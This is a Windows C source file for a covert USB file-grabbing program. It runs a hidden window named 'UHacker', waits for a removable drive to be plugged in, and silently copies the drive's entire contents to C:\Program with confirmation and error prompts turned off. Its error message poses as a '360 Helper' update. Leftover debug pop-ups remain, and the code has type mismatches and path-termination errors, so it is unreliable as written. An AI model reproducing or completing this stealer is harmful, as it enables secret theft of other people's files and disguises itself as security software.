#include <Windows.h>
#include <Dbt.h>
#include <stdio.h>
#include <string.h>
#include <WinInet.h>
#include <Shlwapi.h>
/*-------------------------Functions-STR----------------------------*/
LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam);
LRESULT OnDeviceChange (HWND hwnd, WPARAM wParam, LPARAM lParam);
BOOL	AllCopy (LPCWSTR lpszFromPath, LPCWSTR lpszToPath);
CHAR FirstDriveFromMask(ULONG unitmask);
/*-------------------------Functions-END----------------------------*/
int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance,
				LPSTR lpCmdLine, int nShowCmd)
{
	HWND		hwnd;
	MSG			msg;
	WNDCLASS	wndclass;

	wndclass.style = 0;
	wndclass.cbClsExtra = NULL;
	wndclass.cbWndExtra = NULL;
	wndclass.hbrBackground = NULL;
	wndclass.hIcon = NULL;
	wndclass.hInstance = hInstance;
	wndclass.hCursor = NULL;
	wndclass.lpszClassName = L"UHacker";
	wndclass.lpfnWndProc = WndProc;
	wndclass.lpszMenuName = NULL;

	if (!RegisterClass (&wndclass))
	{
		MessageBox (NULL, TEXT("360 Update Failed"), TEXT("360 Helper"), MB_ICONERROR);
		return 0;
	}
	hwnd = CreateWindow (TEXT("UHacker"), NULL, WS_DISABLED, NULL, NULL, NULL, NULL, NULL, NULL, hInstance, NULL);

	while (GetMessage (&msg, NULL, NULL, NULL))
	{
		TranslateMessage (&msg);
		DispatchMessage (&msg);
	}
	return msg.wParam;
}

LRESULT CALLBACK WndProc (HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	//HWND hWinMain;
	switch (message)
	{
	case WM_CREATE:
		break;
	case WM_DEVICECHANGE:
		OnDeviceChange (hwnd, wParam, lParam);
		return 0;
	case WM_DESTROY:
		PostQuitMessage (0);
		return 0;
	default:
		break;
	}
	return DefWindowProc (hwnd, message, wParam, lParam);
}

LRESULT OnDeviceChange (HWND hwnd, WPARAM wParam, LPARAM lParam)
{
	char uDiskPath[5] = "F:\\";
	char chDisk;
	PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR) lParam;
	switch (wParam)
	{
	case DBT_DEVICEARRIVAL:
		if (lpdb ->dbch_devicetype == DBT_DEVTYP_VOLUME)
		{
			//HANDLE hSearch;
			//BOOL bRet;
			//WIN32_FIND_DATA findData;
			MessageBox (hwnd, TEXT("no"), TEXT("no"), 0);					///////////////////////////////////////////////////////////////////////////
			PDEV_BROADCAST_VOLUME lpdbv = (PDEV_BROADCAST_VOLUME) lpdb;
			chDisk = FirstDriveFromMask (lpdbv ->dbcv_unitmask);
			sprintf(uDiskPath,"%c:\\", chDisk);
			//MessageBox (NULL, TEXT("1"), TEXT("1"), 0);
			//MessageBox (NULL, uDiskPath,uDiskPath, 0);
			//MessageBox (NULL, TEXT("2"), TEXT("2"), 0);
			AllCopy (uDiskPath, "C:\\Program");
		}
		break;
	case DBT_DEVICEREMOVECOMPLETE:
		MessageBox (hwnd, TEXT("BACHU"),TEXT("BACHU"),0);							///////////////////////////////////////////////////////////////////
		break;
	}
	return LRESULT();
}

BOOL AllCopy (LPCWSTR lpszFromPath, LPCWSTR lpszToPath)
{
	SHFILEOPSTRUCT FileOp;
	ZeroMemory (&FileOp, sizeof(SHFILEOPSTRUCT));
	FileOp.fFlags = FOF_SILENT | FOF_NOERRORUI | FOF_NOCONFIRMATION;
	FileOp.hwnd = NULL;
	FileOp.fAnyOperationsAborted = NULL;
	FileOp.hNameMappings = NULL;
	FileOp.lpszProgressTitle = NULL;
	FileOp.pFrom = lpszFromPath;
	FileOp.pTo = lpszToPath;
	FileOp.wFunc = FO_COPY;
	MessageBox (NULL, TEXT("SHFILEOPSTRUCT INSTALL OK"),TEXT("SHFILEOPSTRUCT INSTALL OK"), 0);	///////////////////////////////////////////////////////
	return (SHFileOperation (&FileOp) == 0);
}

CHAR FirstDriveFromMask(ULONG unitmask)
{
    char i;
    for (i = 0; i < 26; ++i)
    {
        if (unitmask & 0x1)
            break;
        unitmask = unitmask >> 1;
    }
	MessageBox (NULL, TEXT("FIRSTDRIVEFROMMASK OK"), TEXT("FIRSTDRIVEFROMMASK OK"), 0);
    return (i + 'A');
}
